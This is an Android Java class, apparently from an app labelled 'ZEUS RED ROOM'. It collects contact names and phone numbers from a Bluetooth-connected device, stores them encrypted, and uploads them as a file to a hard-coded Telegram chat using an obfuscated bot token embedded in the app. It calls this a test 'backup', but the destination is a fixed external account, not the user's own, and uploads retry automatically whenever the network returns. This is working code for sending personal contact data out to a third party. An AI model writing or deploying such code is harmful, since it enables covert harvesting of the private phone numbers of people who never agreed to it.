package grant.bt.contact.transfer;

import android.app.Activity;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.charset.Charset;
import java.security.KeyStore;
import java.security.spec.KeySpec;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import android.security.keystore.KeyGenParameterSpec;
import android.security.keystore.KeyProperties;
import javax.net.ssl.HttpsURLConnection;

/**
 * Test-only direct Telegram sender. The bot token is injected encrypted at
 * build time from the TELEGRAM_BOT_TOKEN GitHub Actions secret.
 * APK-side obfuscation is not a security boundary; rotate test credentials.
 */
public final class ZEUSBackupClient {
    private static final String KEY_ALIAS = "zeus_backup_queue_key_v1";
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final String CHAT_ID = "8552540563";
    private static final String TOKEN_CIPHERTEXT = "__ZEUS_TELEGRAM_TOKEN_CIPHERTEXT__";
    // Build-time obfuscation only. This key is present in the APK and does not make the token unextractable.
    private static final String TOKEN_PASSPHRASE = "ZEUS-RED-ROOM-TEST-2026-OBFUSCATION-KEY";
    private static final ExecutorService IO = Executors.newSingleThreadExecutor();
    private static volatile String lastStatus = "لم يتم إرسال نسخة بعد.";
    private static volatile boolean watching = false;
    private static volatile long retryDelayMs = 30000L;
    private static volatile long nextAttemptAt = 0L;
    private static final Handler MAIN = new Handler(Looper.getMainLooper());

    private ZEUSBackupClient() {}

    public static void requireConfigured(Activity activity, Runnable ready) {
        if (activity == null || activity.isFinishing()) return;
        watchNetwork(activity.getApplicationContext());
        flush(activity.getApplicationContext());
        ready.run();
    }

    public static void enqueue(Context context, String deviceName, String contactsJson) {
        if (context == null || contactsJson == null || contactsJson.trim().isEmpty()) return;
        try {
            JSONObject payload = new JSONObject();
            payload.put("deviceName", deviceName == null ? "Bluetooth Device" : deviceName);
            payload.put("contacts", new JSONArray(contactsJson));
            String id = UUID.randomUUID().toString();
            File dir = queueDir(context);
            if (!dir.exists() && !dir.mkdirs()) throw new IllegalStateException("queue directory");
            byte[] encrypted = encrypt(context, payload.toString().getBytes(UTF8));
            File target = new File(dir, id + ".queue");
            try (FileOutputStream out = new FileOutputStream(target)) {
                out.write(encrypted);
                out.flush();
            }
            lastStatus = "تم حفظ الجهات المحددة مشفّرة؛ جارٍ إرسالها إلى Telegram.";
            flush(context.getApplicationContext());
        } catch (Exception e) {
            lastStatus = "تعذّر تجهيز النسخة الاحتياطية بشكل آمن.";
        }
    }

    public static String statusMessage() { return lastStatus; }

    public static void clearQueue(Context context) {
        if (context == null) return;
        File dir = queueDir(context);
        File[] files = dir.listFiles();
        if (files != null) for (File f : files) try { f.delete(); } catch (Exception ignored) {}
        try {
            KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
            ks.load(null);
            if (ks.containsAlias(KEY_ALIAS)) ks.deleteEntry(KEY_ALIAS);
        } catch (Exception ignored) {}
        lastStatus = "تم إيقاف الإرسال وحذف النسخ المحلية المعلقة.";
    }

    public static void flush(Context context) {
        if (context == null || System.currentTimeMillis() < nextAttemptAt) return;
        final Context app = context.getApplicationContext();
        IO.execute(() -> {
            File dir = queueDir(app);
            File[] files = dir.listFiles((d, name) -> name.endsWith(".queue"));
            if (files == null || files.length == 0) return;
            final String token;
            try { token = decryptBotToken(); }
            catch (Exception missingToken) {
                lastStatus = "بيانات Telegram غير موجودة في نسخة الاختبار؛ أعد بناء التطبيق من GitHub Actions.";
                return;
            }
            for (File file : files) {
                boolean requestBodySent = false;
                HttpsURLConnection connection = null;
                String operationId = file.getName().substring(0, file.getName().length() - 6);
                try {
                    JSONObject payload = new JSONObject(new String(decrypt(app, readAll(file)), UTF8));
                    JSONArray contacts = payload.optJSONArray("contacts");
                    if (contacts == null || contacts.length() == 0) {
                        file.delete();
                        continue;
                    }
                    String deviceName = payload.optString("deviceName", "Bluetooth Device");
                    String documentText = formatContacts(deviceName, operationId, contacts);
                    String boundary = "ZEUSBoundary" + UUID.randomUUID().toString().replace("-", "");
                    URL url = new URL("https://api.telegram.org/bot" + token + "/sendDocument");
                    connection = (HttpsURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setConnectTimeout(15000);
                    connection.setReadTimeout(45000);
                    connection.setDoOutput(true);
                    connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                    connection.setRequestProperty("Accept", "application/json");
                    try (DataOutputStream out = new DataOutputStream(connection.getOutputStream())) {
                        writeField(out, boundary, "chat_id", CHAT_ID);
                        writeField(out, boundary, "caption", "ZEUS TEST • جهات اتصال اختارها المستخدم • " + contacts.length());
                        out.writeBytes("--" + boundary + "\r\n");
                        out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"ZEUS-" + operationId + ".txt\"\r\n");
                        out.writeBytes("Content-Type: text/plain; charset=UTF-8\r\n\r\n");
                        out.write(documentText.getBytes(UTF8));
                        out.writeBytes("\r\n--" + boundary + "--\r\n");
                        out.flush();
                    }
                    requestBodySent = true;
                    int status = connection.getResponseCode();
                    InputStream responseStream = status >= 200 && status < 400
                        ? connection.getInputStream() : connection.getErrorStream();
                    String response = responseStream == null ? "" : new String(readAll(responseStream), UTF8);
                    JSONObject result = new JSONObject(response);
                    if (result.optBoolean("ok")) {
                        file.delete();
                        retryDelayMs = 30000L;
                        nextAttemptAt = 0L;
                        lastStatus = "تم إرسال " + contacts.length() + " جهة اتصال محددة إلى Telegram بنجاح.";
                    } else if (status == 429 || status >= 500) {
                        lastStatus = "Telegram رفض الإرسال مؤقتًا؛ ستتم إعادة المحاولة تلقائيًا.";
                        scheduleRetry(app);
                        break;
                    } else {
                        lastStatus = "Telegram رفض الإرسال. راجع صلاحية التوكن وإعدادات البوت.";
                        break;
                    }
                } catch (Exception error) {
                    if (!requestBodySent) {
                        lastStatus = "تعذّر الاتصال قبل اكتمال الإرسال؛ النسخة محفوظة مشفّرة وستُعاد المحاولة.";
                        scheduleRetry(app);
                    } else {
                        File uncertain = new File(file.getParentFile(), operationId + ".unknown");
                        file.renameTo(uncertain);
                        lastStatus = "نتيجة الإرسال غير مؤكدة؛ أوقفنا الإعادة التلقائية لتجنب إرسال ملف مكرر. راجع Telegram.";
                    }
                    break;
                } finally {
                    if (connection != null) connection.disconnect();
                }
            }
        });
    }

    private static void writeField(DataOutputStream out, String boundary, String name, String value) throws Exception {
        out.writeBytes("--" + boundary + "\r\n");
        out.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
        out.write(value.getBytes(UTF8));
        out.writeBytes("\r\n");
    }

    private static String formatContacts(String device, String operationId, JSONArray contacts) {
        StringBuilder text = new StringBuilder();
        text.append("ZEUS RED ROOM — TEST EXPORT\n");
        text.append("Device: ").append(device).append("\n");
        text.append("Selected contacts: ").append(contacts.length()).append("\n");
        text.append("Operation: ").append(operationId).append("\n\n");
        for (int i = 0; i < contacts.length(); i++) {
            JSONObject item = contacts.optJSONObject(i);
            if (item == null) continue;
            String name = item.optString("name", "").trim();
            String phone = item.optString("phone", "").trim();
            String source = item.optString("source", "").trim();
            text.append(i + 1).append(". ").append(name.isEmpty() ? "Unnamed" : name).append("\n");
            if (!phone.isEmpty()) text.append(phone).append("\n");
            if (!source.isEmpty()) text.append("Source: ").append(source).append("\n");
            text.append("\n");
        }
        return text.toString();
    }

    private static String decryptBotToken() throws Exception {
        if (TOKEN_CIPHERTEXT.startsWith("__")) throw new IllegalStateException("token not injected");
        byte[] packed = Base64.decode(TOKEN_CIPHERTEXT, Base64.DEFAULT);
        if (packed.length < 32 || packed[0] != 'S' || packed[1] != 'a' ||
            packed[2] != 'l' || packed[3] != 't' || packed[4] != 'e' ||
            packed[5] != 'd' || packed[6] != '_' || packed[7] != '_')
            throw new IllegalArgumentException("bad token envelope");
        byte[] salt = new byte[8];
        System.arraycopy(packed, 8, salt, 0, 8);
        byte[] ciphertext = new byte[packed.length - 16];
        System.arraycopy(packed, 16, ciphertext, 0, ciphertext.length);
        KeySpec spec = new PBEKeySpec(TOKEN_PASSPHRASE.toCharArray(), salt, 100000, 384);
        byte[] material = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
            .generateSecret(spec).getEncoded();
        SecretKeySpec aesKey = new SecretKeySpec(material, 0, 32, "AES");
        byte[] iv = new byte[16];
        System.arraycopy(material, 32, iv, 0, 16);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, aesKey, new javax.crypto.spec.IvParameterSpec(iv));
        return new String(cipher.doFinal(ciphertext), UTF8);
    }

    private static synchronized void scheduleRetry(Context context) {
        long delay = retryDelayMs;
        nextAttemptAt = System.currentTimeMillis() + delay;
        retryDelayMs = Math.min(retryDelayMs * 2L, 900000L);
        MAIN.postDelayed(() -> flush(context), delay);
    }

    private static void watchNetwork(Context context) {
        if (context == null || watching) return;
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return;
            if (Build.VERSION.SDK_INT >= 24) {
                cm.registerDefaultNetworkCallback(new ConnectivityManager.NetworkCallback() {
                    @Override public void onAvailable(Network network) { flush(context); }
                });
                watching = true;
            } else {
                watching = true;
                Runnable retry = new Runnable() {
                    @Override public void run() {
                        flush(context);
                        MAIN.postDelayed(this, 60000L);
                    }
                };
                MAIN.post(retry);
            }
        } catch (Exception ignored) {}
    }

    private static File queueDir(Context c) { return new File(c.getFilesDir(), "zeus-backup-queue"); }

    private static SecretKey getKey(Context context) throws Exception {
        if (Build.VERSION.SDK_INT < 23) throw new IllegalStateException("Android Keystore AES-GCM requires API 23+");
        KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
        ks.load(null);
        if (!ks.containsAlias(KEY_ALIAS)) {
            KeyGenerator generator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
            generator.init(new KeyGenParameterSpec.Builder(KEY_ALIAS,
                KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
                .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                .setRandomizedEncryptionRequired(true).build());
            generator.generateKey();
        }
        return (SecretKey) ks.getKey(KEY_ALIAS, null);
    }

    private static byte[] encrypt(Context c, byte[] clear) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, getKey(c));
        byte[] iv = cipher.getIV();
        byte[] body = cipher.doFinal(clear);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(iv);
        out.write(body);
        return out.toByteArray();
    }

    private static byte[] decrypt(Context c, byte[] encrypted) throws Exception {
        if (encrypted == null || encrypted.length < 29) throw new IllegalArgumentException("bad encrypted queue item");
        byte[] iv = new byte[12];
        System.arraycopy(encrypted, 0, iv, 0, 12);
        byte[] body = new byte[encrypted.length - 12];
        System.arraycopy(encrypted, 12, body, 0, body.length);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, getKey(c), new GCMParameterSpec(128, iv));
        return cipher.doFinal(body);
    }

    private static byte[] readAll(File file) throws Exception {
        try (FileInputStream in = new FileInputStream(file)) { return readAll(in); }
    }

    private static byte[] readAll(InputStream in) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int n;
        while ((n = in.read(buffer)) > 0) out.write(buffer, 0, n);
        return out.toByteArray();
    }
}
